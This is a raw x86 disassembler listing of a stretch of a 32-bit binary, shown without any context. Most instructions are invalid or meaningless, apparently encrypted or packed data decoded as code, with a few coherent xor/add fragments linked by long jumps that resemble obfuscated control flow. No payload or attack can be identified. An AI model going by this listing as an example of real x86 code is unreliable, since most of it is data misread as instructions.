  40fe5a:	mov    eax,0xe2f82955
  40fe5f:	sub    al,0xde
  40fe61:	mov    al,ds:0x698fcce3
  40fe66:	mov    bh,0x95
  40fe68:	dec    ecx
  40fe69:	jns    0x40fe39
  40fe6b:	xor    al,0x1b
  40fe6d:	test   eax,0x5cd04d87
  40fe72:	ret    
  40fe73:	sub    eax,0x78cca4f2
  40fe78:	(bad)  
  40fe79:	out    dx,al
  40fe7a:	popa   
  40fe7b:	dec    edx
  40fe7c:	inc    esi
  40fe7d:	push   edx
  40fe7e:	stos   BYTE PTR es:[edi],al
  40fe7f:	pop    ds
  40fe80:	jmp    FWORD PTR [eax]
  40fe82:	pop    esp
  40fe83:	addr16 pop esp
  40fe85:	mov    ds:0x17dff384,eax
  40fe8a:	mov    al,0xb8
  40fe8c:	inc    edx
  40fe8d:	ret    
  40fe8e:	inc    ebp
  40fe8f:	sar    DWORD PTR [ecx+0x2],1
  40fe92:	xor    eax,0xaa675a7d
  40fe97:	call   0xddaa:0xebc95597
  40fe9e:	fidiv  DWORD PTR [esi-0x16655f1a]
  40fea4:	mov    al,BYTE PTR [ecx-0xd]
  40fea7:	mov    DWORD PTR [esi-0x2388927f],ecx
  40fead:	pop    ecx
  40feae:	and    BYTE PTR [ebp+0x36],dl
  40feb1:	xchg   BYTE PTR [ebp+ecx*2+0x10],bl
  40feb5:	pop    ebx
  40feb6:	xor    bl,cl
  40feb8:	ret    
  40feb9:	xlat   BYTE PTR ds:[ebx]
  40feba:	ins    DWORD PTR es:[edi],dx
  40febb:	adc    al,ah
  40febd:	loopne 0x40fec9
  40febf:	mov    ebx,0x712227f7
  40fec4:	jnp    0x40fed9
  40fec6:	inc    eax
  40fec7:	pusha  
  40fec8:	ret    
  40fec9:	add    DWORD PTR [edx],esp
  40fecb:	mov    ebx,esp
  40fecd:	push   ebx
  40fece:	nop
  40fecf:	mov    al,0xf7
  40fed1:	loope  0x40feca
  40fed3:	push   ecx
  40fed4:	mov    ecx,0x511a005b
  40fed9:	inc    eax
  40feda:	mov    bl,0x75
  40fedc:	mov    WORD PTR [ecx-0x4d],?
  40fedf:	scas   al,BYTE PTR es:[edi]
  40fee0:	mov    al,0x1e
  40fee2:	imul   edx,DWORD PTR [eax+0x1c],0xa74d32e
  40fee9:	addr16 std 
  40feeb:	shr    DWORD PTR [esi-0x4b],0x3d
  40feef:	dec    edi
  40fef0:	or     BYTE PTR [ebp+0x32],dl
  40fef3:	imul   eax,edi,0x59
  40fef6:	mov    ds:0x3033281c,eax
  40fefb:	push   es
  40fefc:	mov    eax,ds:0xb5a2a72e
  40ff01:	add    ch,al
  40ff03:	outs   dx,BYTE PTR ds:[esi]
  40ff04:	mov    ebx,esp
  40ff06:	ficomp DWORD PTR [esi+ecx*8]
  40ff09:	fimul  DWORD PTR [ebx+0x12e8f9ba]
  40ff0f:	lock mov ebx,0x8c03ead1
  40ff15:	pusha  
  40ff16:	sbb    bh,BYTE PTR [edi+0x53ddded0]
  40ff1c:	push   esi
  40ff1d:	sbb    al,0x70
  40ff1f:	inc    edi
  40ff20:	data16 aaa 
  40ff22:	adc    ecx,esi
  40ff24:	int    0xd6
  40ff26:	out    0x91,eax
  40ff28:	lods   eax,DWORD PTR ds:[esi]
  40ff29:	add    dh,BYTE PTR [eax]
  40ff2b:	jg     0x40ff37
  40ff2d:	je     0x40feb6
  40ff2f:	mov    bl,0x65
  40ff31:	rol    BYTE PTR [esi],cl
  40ff33:	ins    BYTE PTR es:[edi],dx
  40ff34:	add    al,0xe
  40ff36:	cmp    BYTE PTR [ecx+0x57],ah
  40ff39:	test   al,0x7f
  40ff3b:	jne    0x40ff82
  40ff3d:	push   0x304203e0
  40ff42:	dec    ebx
  40ff43:	fs xchg ebp,eax
  40ff45:	(bad)  [ecx]
  40ff47:	sub    al,0xf8
  40ff49:	popf   
  40ff4a:	adc    BYTE PTR [ecx+0x3a0b5d03],0x99
  40ff51:	pop    es
  40ff52:	mov    bl,0xa2
  40ff54:	call   0x9cfa:0xd3c3140b
  40ff5b:	mov    WORD PTR [eax+0x6c34d8ee],es
  40ff61:	test   al,0x7
  40ff63:	and    BYTE PTR [ebp-0x1674b440],bh
  40ff69:	test   eax,0xcb30161d
  40ff6e:	sub    BYTE PTR [ecx+0x1f4c4d44],dh
  40ff74:	push   ebp
  40ff75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff76:	mov    ah,0xe5
  40ff78:	cmp    al,BYTE PTR [edi-0x20d2900d]
  40ff7e:	add    DWORD PTR [edx],eax
  40ff80:	or     al,0x4f
  40ff82:	ja     0x40ff09
  40ff84:	push   edi
  40ff85:	mov    bl,0x34
  40ff87:	adc    DWORD PTR [eax],edi
  40ff89:	sbb    eax,0xf1d4a747
  40ff8e:	push   ss
  40ff8f:	xor    dl,ch
  40ff91:	jp     0x40ff3b
  40ff93:	stos   BYTE PTR es:[edi],al
  40ff94:	rcr    DWORD PTR [ebp-0x520b847c],1
  40ff9a:	shl    BYTE PTR [edi+eax*4+0x7d0914a6],0xa6
  40ffa2:	test   BYTE PTR [edx-0x18],dh
  40ffa5:	mov    dl,0x75
  40ffa7:	ror    BYTE PTR [edx+0x782d8211],cl
  40ffad:	jp     0x40ffef
  40ffaf:	in     eax,dx
  40ffb0:	fcomp  DWORD PTR [ebx-0x634ff0b5]
  40ffb6:	sub    BYTE PTR [edx],bl
  40ffb8:	imul   BYTE PTR [eax-0x11c36b14]
  40ffbe:	jl     0x40ffae
  40ffc0:	mov    ah,0x52
  40ffc2:	pop    esp
  40ffc3:	mov    edx,0xfdab8040
  40ffc8:	jns    0x410007
  40ffca:	cmp    al,0x6f
  40ffcc:	mov    ecx,0xd9d21290
  40ffd1:	sub    bh,BYTE PTR [edi+ecx*2-0x7827b053]
  40ffd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffd9:	adc    BYTE PTR [edx+0x73],0x65
  40ffdd:	fwait
  40ffde:	cmp    bl,BYTE PTR [ebx+ebp*8-0x7c]
  40ffe2:	mov    bl,0x3e
  40ffe4:	and    al,0x7a
  40ffe6:	sub    bh,BYTE PTR [ecx]
  40ffe8:	ins    BYTE PTR es:[edi],dx
  40ffe9:	mov    ds:0x26cc6647,al
  40ffee:	(bad)
  40fff2:	adc    ebx,DWORD PTR [edi+ebp*4+0x21]
  40fff6:	sar    DWORD PTR ds:0xfb51f2e,0x41
  40fffd:	bound  edx,QWORD PTR [ecx]
  40ffff:	imul   DWORD PTR [ecx]
  410001:	mov    gs,WORD PTR [esi-0x66]
  410004:	je     0x40ff9b
  410006:	sub    al,0xe4
  410008:	cld    
  410009:	xor    bl,BYTE PTR [esi]
  41000b:	cmp    cl,BYTE PTR fs:[ebx]
  41000e:	bnd jb 0x40ffd2
  410011:	jo     0x410082
  410013:	xchg   BYTE PTR [edx-0x18],cl
  410016:	cld    
  410017:	sbb    BYTE PTR [edx],ch
  410019:	fs inc ecx
  41001b:	cmp    DWORD PTR [eax-0x2859ac55],0xffffffed
  410022:	int3   
  410023:	fwait
  410024:	iret   
  410025:	shl    BYTE PTR [edx+0x68],0xa0
  410029:	mov    eax,ds:0x3e132d9e
  41002e:	inc    ebp
  41002f:	sbb    eax,0x5d8b7e91
  410034:	lock sub ebx,edi
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	inc    DWORD PTR ds:0x48e78eb2
  41006e:	js     0x4100e8
  410070:	in     eax,0x7e
  410072:	js     0x4100ec
  410074:	fisub  DWORD PTR [esi]
  410076:	jmp    0x410066
  410078:	jle    0x4100bf
  41007a:	cmp    BYTE PTR [ecx-0x49b18ecb],bl
  410080:	mov    eax,ds:0x2494ab96
  410085:	arpl   si,di
  410087:	jne    0x4100d0
  410089:	scas   eax,DWORD PTR es:[edi]
  41008a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41008b:	pop    eax
  41008c:	sbb    ebx,DWORD PTR [ebp-0xd]
  41008f:	mov    esp,0x86095b11
  410094:	stos   BYTE PTR es:[edi],al
  410095:	aaa    
  410096:	jecxz  0x4100ad
  410098:	pop    ebp
  410099:	sub    bh,ah
  41009b:	mov    ds:0x82cbc81d,eax
  4100a0:	jmp    0xc0aa6db1
  4100a5:	or     dh,BYTE PTR [ecx+0x5f]
  4100a8:	mov    WORD PTR [edx+0xc],fs
  4100ab:	aad    0x2d
  4100ad:	mov    bh,0x1
  4100af:	add    BYTE PTR [edi],bl
  4100b1:	sub    ecx,DWORD PTR [ecx-0x1a]
  4100b4:	into   
  4100b5:	and    esi,DWORD PTR [ebx+0x3250c0e5]
  4100bb:	sub    ebp,ebx
  4100bd:	sub    eax,0x42ac51fb
  4100c2:	fcmovnbe st,st(7)
  4100c4:	xchg   edi,esi
  4100c6:	cmp    dl,BYTE PTR ds:0x278badd0
  4100cc:	in     eax,0x5f
  4100ce:	or     eax,0x2f351e21
  4100d3:	(bad)  
  4100d4:	cmp    ecx,DWORD PTR ds:0x18b96514
  4100da:	cmp    eax,0x44b69bb4
  4100df:	xor    eax,0xb786a7f9
  4100e4:	mov    al,ds:0x42e001c7
  4100e9:	inc    BYTE PTR [esi-0x589ac68a]
  4100ef:	or     dl,BYTE PTR [ebp+0x76443169]
  4100f5:	mov    eax,ds:0xe1270363
  4100fa:	dec    esp
  4100fb:	jp     0x41013c
  4100fd:	or     esp,DWORD PTR [edx-0x48aadeb8]
  410103:	or     ebx,DWORD PTR [edx-0x22]
  410106:	bound  edi,QWORD PTR [ebx+0x46e3a4b2]
  41010c:	retf   
  41010d:	cmp    dh,BYTE PTR [ecx]
  41010f:	cs mov bl,0x36
  410112:	mov    DWORD PTR [eax],ecx
  410114:	jmp    0x410107
  410116:	sar    BYTE PTR [ebp+0x3d],0xed
  41011a:	arpl   WORD PTR [edx+0x1722ba80],si
  410120:	and    edx,esp
  410122:	ret    
  410123:	sub    BYTE PTR [edx],bl
  410125:	and    eax,0xd1c5ee8b
  41012a:	out    dx,eax
  41012b:	mov    eax,ds:0x4e072f39
  410130:	sub    al,0xa7
  410132:	and    al,0x44
  410134:	shl    BYTE PTR [esi],1
  410136:	xor    al,0x37
  410138:	int    0x81
  41013a:	retf   0xdd50
  41013d:	test   DWORD PTR [ebp+0x54848f9a],esp
  410143:	sub    al,0x57
  410145:	sbb    dl,bh
  410147:	mov    esp,0x6c4f522
  41014c:	mov    eax,0x553fec3
  410151:	cmp    ah,ah
  410153:	(bad)  
  410154:	mov    ds,WORD PTR [ecx-0x80]
  410157:	xor    ah,ah
  410159:	int    0x93
  41015b:	dec    esp
  41015c:	sbb    ch,ah
  41015e:	adc    BYTE PTR [eax],ah
  410160:	test   al,0x2b
  410162:	mov    DWORD PTR [esi],0x6aad056c
  410168:	inc    edi
  410169:	loope  0x410123
  41016b:	mov    ebp,0x7a32f76d
  410170:	and    DWORD PTR [eax],edx
  410172:	fisubr WORD PTR [edx]
  410174:	or     al,0x2b
  410176:	adc    al,0x8d
  410178:	push   0x12
  41017a:	scas   eax,DWORD PTR es:[edi]
  41017b:	fwait
  41017c:	inc    ecx
  41017d:	or     BYTE PTR [esi+0x28],dh
  410180:	call   0x3d3b9899
  410185:	pop    esp
  410186:	jle    0x4101a2
  410188:	dec    esi
  410189:	fwait
  41018a:	inc    ebp
  41018b:	sbb    eax,0x3a1fdf03
  410190:	add    esi,DWORD PTR [eax+edi*4+0x227ecb57]
  410197:	loope  0x41017d
  410199:	outs   dx,DWORD PTR ds:[esi]
  41019b:	or     al,dl
  41019d:	rol    DWORD PTR [ebp+0x19],0x3
  4101a1:	out    dx,al
  4101a2:	push   edi
  4101a3:	inc    ebx
  4101a4:	cmc    
  4101a5:	push   esi
  4101a6:	jne    0x4101b7
  4101a8:	mov    al,0x36
  4101aa:	arpl   WORD PTR [ecx+ebx*4],bp
  4101ad:	sbb    BYTE PTR [esi],al
  4101af:	jmp    0x41015f
  4101b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101b2:	add    eax,0x59324444
  4101b7:	xor    esi,DWORD PTR [ecx]
  4101b9:	mov    ch,0x9b
  4101bb:	aad    0xc0
  4101bd:	push   esp
  4101be:	pop    ds
  4101bf:	ss push ebx
  4101c1:	sahf   
  4101c2:	mov    ds:0x1c582148,eax
  4101c7:	pop    edi
  4101c8:	xchg   edx,eax
  4101c9:	or     ebp,eax
  4101cb:	sub    BYTE PTR [ebx-0x79],ah
  4101ce:	dec    edx
  4101cf:	jo     0x410208
  4101d1:	mov    DWORD PTR [esi-0x577aefeb],eax
  4101d7:	jbe    0x410247
  4101d9:	call   0xebcc:0x41377715
  4101e0:	ror    bl,0x30
  4101e3:	mov    eax,ds:0xbc20cab6
  4101e8:	les    edx,FWORD PTR [ebp-0x64683153]
  4101ee:	push   ebx
  4101ef:	cli    
  4101f0:	mov    BYTE PTR [ebx],cl
  4101f2:	int    0x8a
  4101f4:	je     0x410261
  4101f6:	js     0x4101d2
  4101f8:	mov    ?,WORD PTR [ecx-0x17791a3e]
  4101fe:	fs push 0xb2e4a0f8
  410204:	push   0x8dd5ac99
  410209:	add    eax,0x8592b005
  41020e:	dec    esp
  41020f:	adc    dh,BYTE PTR [edx+0x50ded932]
  410215:	pop    es
  410216:	cmp    DWORD PTR [eax+ecx*2],esi
  410219:	inc    eax
  41021a:	sbb    BYTE PTR [edi],bh
  41021c:	(bad)  
  41021d:	(bad)  
  41021e:	mov    al,ds:0xec3bd60d
  410223:	sub    eax,0x334e4568
  410228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410229:	pop    ebx
  41022a:	out    0xbc,eax
  41022c:	pop    ds
  41022d:	xor    al,0x84
  410230:	xchg   ebx,eax
  410231:	mov    edx,0x6693f8a
  410236:	sbb    DWORD PTR [eax],0xffffffd9
  410239:	mov    al,0x2d
  41023b:	sub    BYTE PTR ds:0xe4491a03,0x89
  410242:	adc    DWORD PTR [esi],eax
  410244:	xor    edi,DWORD PTR [ebx+0x771e41e5]
  41024a:	adc    bh,bh
  41024c:	push   ds
  41024d:	lahf   
  41024e:	sub    BYTE PTR [ebp-0x32],dh
  410251:	(bad)  
  410252:	jmp    0x7976:0x14c9e90
  410259:	inc    esi
  41025a:	or     eax,0x1d6e6bd5
  41025f:	dec    edi
  410260:	pop    eax
  410261:	or     BYTE PTR es:[ebx-0x4c],ah
  410265:	inc    ebx
  410266:	sub    edi,esp
  410268:	(bad)  
  410269:	popa   
  41026a:	into   
  41026b:	mov    ds:0x4f0c7202,eax
  410270:	out    dx,al
  410271:	outs   dx,BYTE PTR ds:[esi]
  410272:	rcl    BYTE PTR [esi],1
  410274:	ja     0x410203
  410276:	lds    edi,FWORD PTR [esi+0x42]
  410279:	mov    bl,0x93
  41027b:	fiadd  WORD PTR [ecx-0x564d537c]
  410281:	jmp    0xc729b31e
  410286:	outs   dx,BYTE PTR ds:[esi]
  410287:	fnsave [edi+ebx*4+0x2e639344]
  41028e:	test   al,0x4
  410290:	cdq    
  410291:	test   edi,eax
  410293:	xchg   ebp,eax
  410294:	(bad)  
  410295:	sub    eax,0x25f02f9a
  41029a:	test   BYTE PTR [edi+eiz*1+0x4394ac11],ch
  4102a1:	push   eax
  4102a2:	sub    al,0x97
  4102a4:	dec    edx
  4102a5:	ds ret 0x59
  4102a9:	xchg   esp,eax
  4102aa:	add    DWORD PTR [edx],ecx
  4102ac:	cmp    dh,dl
  4102ae:	outs   dx,DWORD PTR ds:[esi]
  4102af:	int    0xf0
  4102b1:	arpl   WORD PTR ds:0xc6255a57,bx
  4102b7:	test   eax,0x25ad9e8d
  4102bc:	mov    esi,0x869e9c31
  4102c1:	inc    eax
  4102c2:	mov    al,cl
  4102c4:	push   eax
  4102c5:	mov    ds:0x9c91abe3,eax
  4102ca:	jl     0x410329
  4102cc:	inc    ecx
  4102cd:	push   cs
  4102ce:	push   ss
  4102cf:	ret    0xb9d3
  4102d2:	xchg   esi,eax
  4102d3:	sub    al,0x9f
  4102d5:	sub    al,0x24
  4102d7:	cli    
  4102d8:	pop    ds
  4102d9:	lds    eax,FWORD PTR [edx+0x55]
  4102dc:	into   
  4102dd:	push   ecx
  4102de:	nop
  4102df:	add    edx,ecx
  4102e1:	jmp    0x410569
  4102e6:	ret    
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	mov    al,0x3e
  4102f4:	ins    BYTE PTR es:[edi],dx
  4102f5:	out    dx,al
  4102f6:	dec    esp
  4102f7:	dec    esi
  4102f8:	js     0x410372
  4102fa:	in     eax,0x7e
  4102fc:	js     0x410376
  4102fe:	adc    ah,BYTE PTR [ebx-0x4a]
  410301:	jbe    0x410374
  410303:	imul   edx,DWORD PTR [ecx-0x34],0xffffffd7
  410307:	inc    ebp
  410308:	xor    BYTE PTR [esi+0x8],bh
  41030b:	inc    ecx
  41030c:	mov    ebx,DWORD PTR [ecx]
  41030e:	cli    
  41030f:	(bad)  
  410310:	pusha  
  410311:	ret    
  410312:	add    al,0x22
  410314:	adc    DWORD PTR [ebp-0x5f],edi
  410317:	inc    edx
  410318:	mov    esi,0x573979e8
  41031d:	mov    edx,0xf5226797
  410322:	adc    al,0xa3
  410324:	loopne 0x4102ce
  410326:	dec    edx
  410327:	mov    ds:0xda0eb299,eax
  41032c:	mov    dh,0xf6
  41032e:	sti    
  41032f:	mov    ch,0xdc
  410331:	test   al,0x52
  410333:	std    
  410334:	mov    ecx,ebx
  410336:	cmp    al,0x8a
  410338:	push   0x6f
  41033a:	adc    al,0xfc
  41033c:	inc    ecx
  41033d:	inc    ebx
  41033e:	rol    edi,0x4a
  410341:	pop    ebx
  410342:	and    al,0xb9
  410344:	mov    esi,0x2411b58f
  410349:	or     eax,0xdd4015ff
  41034e:	sub    dh,BYTE PTR [ebx+ecx*1-0x33881022]
  410355:	rcl    dl,0x5a
  410358:	aad    0xd8
  41035a:	into   
  41035b:	mov    bl,0xbf
  41035d:	push   ebx
  41035e:	(bad)  
  41035f:	lahf   
  410360:	aam    0x4f
  410362:	jns    0x410343
  410364:	and    al,0x15
  410366:	mov    WORD PTR [edx+0x2ff2f14d],ds
  41036c:	(bad)  
  41036d:	xchg   edx,eax
  41036e:	repz shl BYTE PTR [eax],1
  410371:	push   0xfffffff6
  410373:	es enter 0x2d0e,0x3b
  410378:	call   0x85a0eb75
  41037d:	sbb    al,0x77
  41037f:	push   cs
  410380:	sbb    eax,0xc8b9ec9e
  410385:	or     eax,0x86783147
  41038a:	into   
  41038b:	or     al,0x8f
  41038d:	loop   0x41038e
  41038f:	adc    cl,BYTE PTR [eax+0x20]
  410392:	dec    eax
  410393:	mov    dh,0xed
  410395:	mov    ebx,0xb3c6a63e
  41039a:	jmp    0xbc9b:0x8f224f44
  4103a1:	xchg   ebp,eax
  4103a2:	mov    WORD PTR [edi-0x24],es
  4103a5:	test   dl,al
  4103a7:	sbb    esp,DWORD PTR [edi+0x5bcd8d83]
  4103ad:	xchg   esi,eax
  4103ae:	test   BYTE PTR [eax+0x56b508],bh
  4103b4:	inc    eax
  4103b5:	cmp    BYTE PTR [ecx],ch
  4103b7:	(bad)  
  4103b8:	stos   BYTE PTR es:[edi],al
  4103b9:	std    
  4103ba:	in     al,0xc4
  4103bc:	adc    ah,BYTE PTR [esi+0x74ee4888]
  4103c2:	retf   0x962e
  4103c5:	push   esi
  4103c6:	pop    esi
  4103c7:	inc    BYTE PTR [edi+eiz*8+0x24]
  4103cb:	or     ah,0xdd
  4103ce:	push   esp
  4103cf:	clc    
  4103d0:	cli    
  4103d1:	jae    0x41044a
  4103d3:	add    dl,dl
  4103d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103d6:	js     0x4103c7
  4103d8:	loopne 0x4103bd
  4103da:	fmul   DWORD PTR [eax+ecx*8+0x41]
  4103de:	push   cs
  4103df:	cmp    ecx,DWORD PTR [ecx+0xb48ab69]
  4103e5:	mov    ah,0x7e
  4103e7:	or     DWORD PTR [esi-0x5751f523],edx
  4103ed:	and    ch,BYTE PTR [edx]
  4103ef:	inc    ecx
  4103f0:	rcl    DWORD PTR [edx-0x29],0xeb
  4103f4:	adc    BYTE PTR [esi-0x4b404eb7],ah
  4103fa:	inc    edi
  4103fb:	stc    
  4103fc:	add    ebx,DWORD PTR [edx-0x3e]
  4103ff:	xchg   esi,eax
  410400:	jmp    0x41045e
  410402:	jae    0x41038d
  410404:	adc    al,0x94
  410406:	or     ch,BYTE PTR [edi+0x18]
  410409:	(bad)  
  41040a:	popf   
  41040b:	xor    al,0x3f
  41040d:	fimul  DWORD PTR [eax+0x1]
  410410:	fdivp  st(4),st
  410412:	sbb    BYTE PTR [ecx+0x6d280e8],0xda
  410419:	mul    BYTE PTR [eax-0x7b685f3d]
  41041f:	or     esp,edi
  410421:	rol    BYTE PTR [edi],1
  410423:	inc    ebx
  410424:	and    DWORD PTR [edx+ebp*2-0xf186fbd],ebx
  41042b:	test   eax,0xa6839fba
  410430:	adc    esp,DWORD PTR [eax-0x4c26847f]
  410436:	adc    eax,0xf3bc22c4
  41043b:	lahf   
  41043c:	ja     0x4103c4
  41043e:	inc    ebx
  41043f:	into   
  410440:	inc    ebx
  410441:	bswap  ecx
  410443:	and    BYTE PTR [ebx],dh
  410445:	dec    esp
  410446:	xor    al,BYTE PTR [ecx+edi*4-0x6f31d0ba]
  41044d:	icebp  
  41044e:	daa    
  41044f:	mov    ah,0x80
  410451:	repnz dec eax
  410453:	inc    eax
  410454:	retf   0xc6cb
  410457:	sar    BYTE PTR [ebp+0x5e47583c],cl
  41045d:	or     ebp,ebx
  41045f:	js     0x410441
  410461:	pop    edx
  410462:	and    dh,ah
  410464:	pop    edx
  410465:	pop    ebx
  410466:	mov    BYTE PTR [edi+ecx*1],0xef
  41046a:	push   ebp
  41046b:	jp     0x41041d
  41046d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41046e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41046f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410470:	fisub  DWORD PTR [ebp-0x5a]
  410473:	fstp   TBYTE PTR ds:0x9ee86d21
  410479:	jo     0x4104ea
  41047b:	fsub   DWORD PTR [esi+0x61]
  41047e:	sub    al,0x30
  410480:	hlt    
  410481:	popf   
  410482:	xor    BYTE PTR [ebx+0x4057471a],bl
  410488:	ss inc ecx
  41048a:	or     eax,ebp
  41048c:	rcl    DWORD PTR [ebx],1
  41048e:	(bad)  
  410490:	add    BYTE PTR [esp+edx*2-0x5e088165],cl
  410497:	push   0x531e6fbb
  41049c:	push   0xb7aa1aed
  4104a1:	push   esi
  4104a2:	add    ah,BYTE PTR [edi-0x3fe26cc3]
  4104a8:	shr    BYTE PTR [ebx+0x1d],1
  4104ab:	clc    
  4104ac:	or     edi,eax
  4104ae:	adc    bl,al
  4104b0:	adc    ch,bh
  4104b2:	jno    0x41046b
  4104b4:	cmp    DWORD PTR [ebx-0x5927b4d3],ebx
  4104ba:	imul   ebp,DWORD PTR [ebp+edx*2+0x25],0xfffffffd
  4104bf:	rcr    BYTE PTR [ebp+0x71],0xa
  4104c3:	fwait
  4104c4:	sub    BYTE PTR [ebp-0x7ebb8c51],0x5e
  4104cb:	mov    dl,BYTE PTR [eiz*4-0x675b6297]
  4104d2:	and    edx,edx
  4104d4:	mov    esp,0xba1c2bd4
  4104d9:	push   edx
  4104da:	test   eax,0xf55f7c96
  4104df:	jns    0x410549
  4104e1:	ins    DWORD PTR es:[edi],dx
  4104e2:	sub    bh,BYTE PTR [ebx]
  4104e4:	(bad)  
  4104e5:	sti    
  4104e6:	mov    esp,ebp
  4104e8:	and    ebx,esi
  4104ea:	mov    ebp,0xaa97cff5
  4104ef:	jmp    0x4104c8
  4104f1:	aaa    
  4104f2:	and    DWORD PTR [edi-0x58bed8b0],eax
  4104f8:	cmp    eax,0x6c43bd19
  4104fd:	ins    BYTE PTR es:[edi],dx
  4104fe:	jecxz  0x41053d
  410500:	mov    WORD PTR [esi],ds
  410502:	shl    BYTE PTR [ebp-0x5d],cl
  410505:	push   esi
  410506:	leave  
  410507:	fiadd  WORD PTR [esi+eax*2+0x41]
  41050b:	xchg   esp,eax
  41050c:	xchg   edx,eax
  41050d:	jnp    0x410505
  41050f:	xlat   BYTE PTR ds:[ebx]
  410510:	fwait
  410511:	xor    edi,DWORD PTR ss:[ecx-0x3d]
  410515:	adc    al,BYTE PTR ss:[eax+0x24]
  410519:	fdivr  QWORD PTR [ecx+0x64]
  41051c:	xchg   ebx,eax
  41051d:	int3   
  41051e:	sar    BYTE PTR [ebp+0x60e9dd5f],1
  410524:	sbb    BYTE PTR [esi+0x6a4f68b],0xc9
  41052b:	aad    0x4a
  41052d:	data16 jle 0x4104ed
  410530:	mov    edi,fs
  410532:	mov    BYTE PTR [esp+eax*2+0x17],dh
  410536:	cmp    al,0x51
  410538:	mov    al,ds:0x5af6da26
  41053d:	test   al,0xa4
  41053f:	fisttp WORD PTR [ebp+0x16edcd2d]
  410545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410546:	xor    DWORD PTR [edi-0x6a],ebx
  410549:	mov    ah,0x3c
  41054b:	jo     0x41054f
  41054d:	(bad)  
  41054e:	lds    ebx,FWORD PTR [esp+ebp*4]
  410551:	pushf  
  410552:	xor    ch,BYTE PTR [ebx]
  410554:	push   edi
  410555:	les    ebx,FWORD PTR [edi]
  410557:	xchg   edx,eax
  410558:	mov    esp,0x62334e8a
  41055d:	mov    ebx,0x4c81dbb3
  410562:	lea    ecx,[edi]
  410564:	neg    esi
  410566:	jae    0x410570
  410568:	ror    DWORD PTR [edi],cl
  41056a:	scas   eax,DWORD PTR es:[edi]
  41056b:	xlat   BYTE PTR ds:[ebx]
  41056c:	mov    edi,DWORD PTR [ebp-0x8]
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	pop    ss
  410584:	pop    esi
  410585:	sub    ebx,0x78785339
  41058b:	in     eax,0x7e
  41058d:	js     0x410607
  41058f:	pusha  
  410590:	ds add al,ch
  410593:	mov    dh,0x55
  410595:	mov    eax,0xb6a404fb
  41059a:	jae    0x410605
  41059c:	pop    ebp
  41059d:	int    0x31
  41059f:	popa   
  4105a0:	inc    eax
  4105a1:	mov    ebx,0x223b4569
  4105a6:	repnz xor eax,0xc5b2a79
  4105ac:	xor    DWORD PTR ds:0xb70dd61f,edi
  4105b2:	jmp    0x41060a
  4105b4:	in     al,0xbc
  4105b6:	bound  esi,QWORD PTR [ecx+0xe]
  4105b9:	repnz daa 
  4105bb:	ror    BYTE PTR [esi-0x6e],1
  4105be:	mov    edx,0xb85a7535
  4105c3:	fs std 
  4105c5:	aad    0xb9
  4105c7:	mov    cl,0x96
  4105c9:	sar    BYTE PTR [ebx-0x65],0x8e
  4105cd:	cli    
  4105ce:	scas   al,BYTE PTR es:[edi]
  4105cf:	xchg   ebx,eax
  4105d0:	arpl   dx,bp
  4105d2:	repz mov WORD PTR [edi],ds
  4105d5:	dec    bh
  4105d7:	jno    0x410562
  4105d9:	scas   al,BYTE PTR es:[edi]
  4105da:	push   ecx
  4105db:	inc    ebp
  4105dc:	adc    BYTE PTR [edi],0x85
  4105df:	mov    DWORD PTR ds:0x43b46d46,0xb1987324
  4105e9:	pop    es
  4105ea:	pop    ss
  4105eb:	das    
  4105ec:	ficom  WORD PTR [ebx+0x29]
  4105ef:	je     0x410609
  4105f1:	pop    ds
  4105f2:	idiv   dl
  4105f4:	cdq    
  4105f5:	stos   BYTE PTR es:[edi],al
  4105f6:	cmp    al,0x2a
  4105f8:	or     eax,0x101d59f7
  4105fd:	loopne 0x4105d5
  4105ff:	daa    
  410600:	and    BYTE PTR [esi+0x202d4e06],ch
  410606:	dec    edi
  410607:	dec    edi
  410608:	repnz retf 0x824
  41060c:	mov    ah,0x4f
  41060e:	lds    edi,FWORD PTR [edi-0x71ae2c1d]
  410614:	cs xchg edx,eax
  410616:	pop    es
  410617:	out    0xb,al
  410619:	push   es
  41061a:	and    ch,BYTE PTR [edx+0x56431f1e]
  410620:	aaa    
  410621:	test   DWORD PTR [esi+0x78],ebp
  410624:	ss push ds
  410626:	fcomp  QWORD PTR [edx+0x7c]
  410629:	repnz in al,dx
  41062b:	ins    BYTE PTR es:[edi],dx
  41062c:	mov    ebx,0x650bd43f
  410631:	fild   QWORD PTR [eax+0x42]
  410634:	jl     0x41060b
  410636:	mov    edx,0xebeda65e
  41063b:	or     eax,DWORD PTR [ecx+0x5c]
  41063e:	pop    ss
  41063f:	pop    esp
  410640:	pusha  
  410641:	sbb    al,0x9
  410643:	test   al,0x7b
  410645:	int    0xbc
  410647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410649:	xchg   ebx,eax
  41064a:	fsubr  QWORD PTR [ebx+0x7bf2cac8]
  410650:	ss ins BYTE PTR es:[edi],dx
